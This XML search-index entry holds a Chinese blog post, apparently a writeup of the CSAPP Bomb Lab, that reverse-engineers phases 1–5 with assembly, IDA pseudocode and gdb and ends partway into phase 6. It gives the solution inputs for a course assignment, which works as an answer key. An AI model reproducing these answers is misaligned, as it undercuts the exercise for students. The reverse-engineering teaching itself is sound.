<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSAPP Bomb Lab Writeup</title>
    <url>/2021/01/13/CSAPP-Bomb-Lab-Writeup/</url>
    <content><![CDATA[<p>这是CSAPP的bomblab，对打pwn的新手补补基础还是非常有用的，尤其是各种汇编操作和IDA Pro里各种各样的奇妙语法，更是让我这个菜鸡大开眼界（还能这么坑……）</p>
<p>前五关非常的常规，我们通过汇编跟反汇编都看一下。</p>
<p>第六关我不行了，就通过反汇编的C代码走一走。</p>
<p>做了一个晚上加半个早上，终于搞定了，是我太菜……</p>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>其中0x402400这个地址很奇妙，我们用gdb跟进去看一看：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase1.png">
<p>这里的<code>test</code>跟<code>je</code>两个汇编语句是连接在一起的，一般就像是这样用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test %rax, %rax</span><br><span class="line">je 0x??????</span><br></pre></td></tr></table></figure>
<p><code>test</code>语句本质就是一个<code>and</code>，不过用<code>test</code>的话不会去改变%rax的值，而会直接放到下面来进行比较。</p>
<p>这两句汇编的意思就是%rax值等于0时就跳转，否则不跳转，执行下一条命令。</p>
<p>就是比较字符串相等就可以进入下一步了。</p>
<p>所以只需要保证输入的字符串是<code>&quot;Border relations with Canada have never been better.&quot;</code>，就可以了。</p>
<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase1(IDA).png">
<p>用IDA的话一眼看出来，就不用分析了。</p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><h3 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>按照汇编来分析，stack frame的构造如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04(rbp)</span><br><span class="line">0x08      rbp</span><br><span class="line">0x1c          [5]</span><br><span class="line">0x10          [4]</span><br><span class="line">0x14          [3]</span><br><span class="line">0x18          [2]</span><br><span class="line">0x1c          [1] &lt;- rbx</span><br><span class="line">0x20 rsp  rsi [0] &lt;- rax</span><br></pre></td></tr></table></figure>
<p>在从<code>rsp - 0x20</code>到<code>rsp - 0x08</code>遍历的过程中，rax永远在栈上比rbx的地址小个4，也就是一个<code>int</code>的位置。每次check之后依次往后移一位。</p>
<p>我们需要满足的是两倍的rax等于rbx，也就是我们输入的数列是成倍增长的。</p>
<p>还有一个条件：读入到<code>rsp - 0x20</code>，也就是第一个数字，必须是1。</p>
<p>所以最终的输入就是<code>1 2 4 8 16 32</code>。</p>
<h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase2(IDA).png">
<p>输入六个整数，需要符合里面的这个规则：<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v2 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v2 != v5);</span><br></pre></td></tr></table></figure><br>这里需要注意：在第三行的代码里，<code>v2</code>先被强制类型转换为<code>DWORD*</code>，然后再执行减1的操作。</p>
<p>因为<code>v2</code>的指针类型在减1之前已经确定，所以实际上<code>*((_DWORD *)v2 - 1)</code>就相当于<code>*(_DWORD *)(v2 - 4)</code>，也就是数组里面的上一个元素。</p>
<p>所以六个整数，只需要满足后一个是前一个的两倍，就可以了。</p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>非常简单，switch里面提供了8个配套选择，任选一个即可过关。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase3(IDA).png">
<h3 id="汇编-2"><a href="#汇编-2" class="headerlink" title="汇编"></a>汇编</h3><p>然而这个关卡的话看汇编会比较难看出来。这也是这一关的价值所在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>stack frame大概长这样：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure><br>发现了第一个奇妙地址0x4025cf，我们也用gdb看看：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase3_disass.png">
<p>害……</p>
<p>不过这里有另一个奇妙地址，其实这句话就是switch汇编实现的核心：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>穿插复习下括号里两个数字和三个数字的表示法：</p>
<ul>
<li>(a, b) = a + b</li>
<li>(a, b, c) = a + b * c</li>
</ul>
<p>这种括号的表示方法不只在lea指令里面能用，在其他指令里也能见到。</p>
<p>再查一查0x402470这个地址的值，还有后面几个地址的值：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase3_switch.png">
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) p&#x2F;x *0x402470</span><br><span class="line">$9 &#x3D; 0x400f7c</span><br><span class="line">(gdb) p&#x2F;x *0x402478</span><br><span class="line">$10 &#x3D; 0x400fb9</span><br><span class="line">(gdb) p&#x2F;x *0x402480</span><br><span class="line">$11 &#x3D; 0x400f83</span><br><span class="line">(gdb) p&#x2F;x *0x402488</span><br><span class="line">$12 &#x3D; 0x400f8a</span><br><span class="line">(gdb) p&#x2F;x *0x402490</span><br><span class="line">$13 &#x3D; 0x400f91</span><br><span class="line">(gdb) p&#x2F;x *0x402498</span><br><span class="line">$14 &#x3D; 0x400f98</span><br><span class="line">(gdb) p&#x2F;x *0x4024a0</span><br><span class="line">$15 &#x3D; 0x400f9f</span><br><span class="line">(gdb) p&#x2F;x *0x4024a8</span><br><span class="line">$16 &#x3D; 0x400fa6</span><br><span class="line">(gdb) p&#x2F;x *0x4024b0</span><br><span class="line">$17 &#x3D; 0x7564616d</span><br></pre></td></tr></table></figure>
<p>可以发现，从0x402470开始储存的是一个指针数组，因为是64位，所以地址自然是8个字节8个字节间隔的。</p>
<p>并且，这个数组里的指针指向的值，都是<code>phase_3</code>函数的mov指令，即对应了switch语句中的不同分支。</p>
<blockquote>
<p>说句题外话，之所以switch中每个case的最后一般都得加一个<code>break</code>，就是因为在底层就是这样实现的。如果不加<code>break</code>，在每一句执行后就不会<code>jmp</code>出这个switch的判断，在这里就可能%eax被多次赋值。所以该加<code>break</code>还是得加的哦！</p>
</blockquote>
<p>一一对应后，可以梳理出能够通过的8个输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: 0xcf</span><br><span class="line">1: 0x137</span><br><span class="line">2: 0x2c3</span><br><span class="line">3: 0x100</span><br><span class="line">4: 0x185</span><br><span class="line">5: 0xce</span><br><span class="line">6: 0x2aa</span><br><span class="line">7: 0x147</span><br></pre></td></tr></table></figure>
<p>任选其一，就能通过第三关。</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase4(IDA).png">
<p>这个部分我们需要保证第一个读入的整数<code>v3</code>小于等于14的同时，<code>func4(v3, 0, 14)</code>也等于0，第二个读入的整数<code>v4</code>也要等于0。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/func4(IDA).png">
<p>而要使这个函数的返回值为0，只需要让<code>a1 = v3 = (14 - 0) / 2 + 0 = 7</code>。</p>
<h3 id="汇编-3"><a href="#汇编-3" class="headerlink" title="汇编"></a>汇编</h3><p>然而汇编并不像IDA反汇编出来的这样清晰，这一关一眼看上去可能眼花，认真看就好了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>栈布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure>
<p>在这里需要满足的有：</p>
<ul>
<li><code>0xe &gt;= *(rsp + 0x8)</code></li>
<li><code>0x0 == *(rsp + 0xc)</code></li>
<li><code>func4(*(rsp + 0x8), 0, 0xe) == 0</code></li>
</ul>
<p>我们进入<code>func4</code>看看汇编：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>没有什么栈的布局，就是些寄存器之间的计算，我们一个一个模拟一下：</p>
<p>（初始化：rdi = ?, rsi = 0, rdx = 0xe）</p>
<ol>
<li>eax = edx,  eax = 0xe</li>
<li>eax -= esi, eax = 0xe</li>
<li>ecx = eax,  ecx = 0xe</li>
<li>ecx &gt;&gt;= 0x1f, ecx &gt;&gt;= 31, ecx = 0（注意是逻辑右移）</li>
<li>eax += ecx, eax = 0xe</li>
<li>eax &gt;&gt;= 1, eax = 0x7（注意是算术右移，且只有一个参数时默认右移1位）</li>
<li>ecx = rax + rsi * 1 = 0x7 + 0 = 0x7</li>
</ol>
<p>然后我们分析下后面跳转的流程：</p>
<ul>
<li>如果%edi &lt;= %ecx，就会跳转到0x400ff2去。</li>
<li>跳转完再来一个cmp，如果%edi &gt;= %ecx，就可以调到0x401007结束函数了。</li>
</ul>
<p>所以只需要%ecx和%edi一样大就可以了，所以rdi直接等于7就可以了。</p>
<p>所以我们直接输入7跟0就可以了。</p>
<p>所以最后复习下这些奇妙的汇编指令，以免我又忘了：</p>
<ul>
<li><code>imul src, dest</code> 乘法</li>
<li><code>sal  src, dest</code> 算术左移</li>
<li><code>sar  src, dest</code> 算术右移</li>
<li><code>shl  src, dest</code> 逻辑左移</li>
<li><code>shr  src, dest</code> 逻辑右移</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><h3 id="汇编-4"><a href="#汇编-4" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>这个函数的stack frame是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phase 5</span><br><span class="line">0x00 (rsp)</span><br><span class="line">0x08 canary</span><br><span class="line">0x10 rdi</span><br><span class="line">0x18</span><br><span class="line">0x20 rsp</span><br></pre></td></tr></table></figure>
<p>同样有奇妙地址，我们查一查：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase5_str.png">
<p>这个字符串打印出来之所以这样，是因为它最后一位不是<code>\x00</code>，所以就连续着把紧连着的下一个字符串也输出出来了。</p>
<p>最开始在call出<code>string_length</code>之前的这部分是用来初始化canary的。不用管。</p>
<p>字符串长度必须为6，才能跳转，不然会踩雷。</p>
<p>接下来从0x40108b开始，就是一个6次的循环，rax充当循环的counter，很容易看出来。</p>
<p>如果我们过完这个循环，最终要满足的是这个条件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br></pre></td></tr></table></figure><br>所以我们要做的，就是在跑完上面这次循环之后，让<code>rsp + 0x10</code>开始的字符串跟<code>flyers</code>一毛一样。</p>
<p>这段代码粘下来集中看一看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>开始模拟：</p>
<p>（初始化rbx指向的是最开始的rdi，也就是字符串的开始）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ecx &#x3D; str[i]</span><br><span class="line">*rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">rdx &#x3D; *rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">edx &amp;&#x3D; 0xf</span><br><span class="line">edx &#x3D; array3449[cl]</span><br><span class="line">*(rsp + rax + 0x10) &#x3D; dl (lower 4 digits of array3449[cl])</span><br></pre></td></tr></table></figure>
<p>最后的这个<code>(rsp + rax + 0x10)</code>看上去不认识，但是参照下上面的栈结构，其实表示的就是字符串的第i位。</p>
<p>所以我们只需要去注意输入的6个字符中，每个字符的低4位在<code>array3449</code>中索引出来的值，这些值就会一个一个的，填到以<code>rsp + 0x10</code>为开始的字符串中。</p>
<p>手动数一数下标，就可以发现，要对应弄出<code>flyers</code>，我们依次需要下标是<code>9 15 14 5 6 7</code>。</p>
<p>所以我们只需要翻翻ASCII表，找到低4位是这些的字符，拼到一起就可以了。</p>
<p>我最终的答案是<code>ionefg</code>。答案不唯一。</p>
<h3 id="IDA-4"><a href="#IDA-4" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Bomb-Lab-Writeup/phase5(IDA).png">
<p>主要是这句代码太具有迷惑性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>正确的解读是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[a1[i] &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>在C里面，一个char所占据的大小恰好就是一个byte，所以<code>_BYTE</code>可以直接看成<code>char</code>。</p>
<p>这里我之所以迷糊，是因为IDA Pro反汇编说<code>a1</code>的类型是<code>int64</code>，然而事实上<code>a1</code>就是个字符串。</p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>最后一关，太复杂了！那我们就不分析汇编，直接上手看IDA Pro弄出来的代码。</p>
<p>其实弄出来的代码也不好看懂，一不小心也很容易晕！这里重新做一下记录。</p>
<h3 id="IDA-5"><a href="#IDA-5" class="headerlink" title="IDA"></a>IDA</h3><p>反汇编出来的代码长这样，非常长，变量非常多。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span 